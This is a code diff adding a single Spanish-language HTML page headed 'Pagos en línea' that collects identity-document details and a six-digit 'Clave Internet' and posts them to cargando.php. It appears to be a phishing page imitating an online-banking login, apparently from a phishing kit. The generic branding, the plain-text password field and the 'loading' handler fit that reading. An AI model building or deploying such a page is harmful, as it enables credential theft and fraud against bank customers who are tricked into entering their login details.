@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
+    />
+
+    <link rel="stylesheet" href="files/hojadestilo.css" />
+    <title>F-Clientes</title>
+  </head>
+  <body>
+    <br />
+    <form method="post" action="cargando.php">
+      <p class="focus">
+        <img src="files/spaceLogo-1.png" alt="" style="width: 200px" />
+      </p>
+      <br />
+      <center>
+        <div class="elcontenido">
+          <br />
+          <h1
+            style="padding: 10px; color: rgb(193, 193, 193); font-weight: 300"
+          >
+            Pagos en línea
+          </h1>
+          <br /><br />
+
+          <span style="line-height: 1; margin-left: -300px"
+            >Tipo de Persona</span
+          ><br />
+
+          <select
+            name="tipoper"
+            style="width: 410px; height: 50px"
+            class="xinput"
+          >
+            <option value="Natural">Persona Natural</option>
+            <option value="Juridica">Persona Juridica</option>
+          </select>
+          <br />
+          <span style="line-height: 1; margin-left: -280px"
+            >Tipo de Documento</span
+          ><br />
+
+          <select
+            name="tipodoc"
+            style="width: 410px; height: 50px"
+            class="xinput"
+          >
+            <option value="Cédula Ciudadanía">Cédula Ciudadanía</option>
+            <option value="Cédula de Entranjería">Cédula de Entranjería</option>
+            <option value="Pasaporte">Pasaporte</option></select
+          ><br />
+          <span style="line-height: 1; margin-left: -260px"
+            >Número de Documento</span
+          ><br />
+          <input
+            autocomplete="off"
+            required=""
+            id="numd"
+            name="numd"
+            inputmode="numeric"
+            class="xinput"
+            placeholder="Escribe el número de documento"
+            type="text"
+          />
+          <br />
+          <span style="line-height: 1; margin-left: -320px">Clave Internet</span
+          ><br />
+          <input
+            minlength="6"
+            maxlength="6"
+            required=""
+            autocomplete="off"
+            id="numcl"
+            name="numcl"
+            class="xinput"
+            placeholder="Escribe tu clave nnternet"
+            type="text"
+          /><br />
+
+          <input value="Ingresar" class="delboton" type="submit" />
+
+          <h4
+            style="padding: 10px; color: rgb(193, 193, 193); font-weight: 300"
+          >
+            Recuerda ingresar todos los datos solicitados, este paso es
+            obligatorio!
+          </h4>
+        </div>
+      </center>
+    </form>
+  </body>
+</html>
